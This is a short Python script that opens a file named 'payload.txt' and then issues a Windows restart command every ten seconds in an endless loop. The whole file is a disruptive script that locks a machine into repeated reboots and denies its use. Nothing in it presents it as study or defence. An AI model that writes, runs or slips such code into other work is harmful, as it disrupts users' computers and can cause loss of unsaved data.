import os
import schedule
import time

cmd= 'start payload.txt'
os.system(cmd)



def start():
    import os

    cmd= 'shutdown/r'
    os.system(cmd)

schedule.every(10).seconds.do(start)

while 1==1:
    schedule.run_pending()
    time.sleep(1)